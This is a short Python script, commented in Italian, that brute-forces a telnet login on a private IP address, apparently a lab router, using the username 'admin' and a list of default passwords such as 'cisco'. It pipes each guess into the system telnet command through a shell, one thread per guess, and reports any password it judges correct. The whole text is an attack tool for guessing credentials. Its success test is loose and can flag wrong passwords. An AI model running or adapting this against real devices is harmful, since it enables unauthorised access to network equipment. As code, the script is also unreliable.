#!/usr/bin/env python3
import subprocess
import threading
import queue
import time

TARGET_IP = "192.168.122.156"
USERNAME = "admin"
PASSWORD_LIST = ["cisco", "admin", "password", "12345"]

def test_password(password, result_queue):
    """Usa il comando telnet di sistema"""
    try:
        # Usa `expect` o `echo` per automatizzare telnet
        cmd = f'(sleep 1; echo "{USERNAME}"; sleep 1; echo "{password}"; sleep 1; echo "exit") | telnet {TARGET_IP}'
        process = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
        
        if "Password:" in process.stderr or ">" in process.stdout:
            result_queue.put(password)
    except Exception:
        pass

def main():
    print(f" TELNET CRACKER - Versione System Command")
    print("=" * 50)
    
    result_queue = queue.Queue()
    threads = []
    
    start_time = time.time()
    
    # Crea thread per ogni password
    for pwd in PASSWORD_LIST:
        t = threading.Thread(target=test_password, args=(pwd, result_queue))
        t.start()
        threads.append(t)
    
    # Aspetta che qualcuno trovi la password
    while all(t.is_alive() for t in threads):
        if not result_queue.empty():
            trovata = result_queue.get()
            print(f"\n Password trovata: {trovata}")
            break
        time.sleep(0.1)
    
    elapsed = time.time() - start_time
    print(f" Tempo: {elapsed:.2f} secondi")

if __name__ == "__main__":
    main()
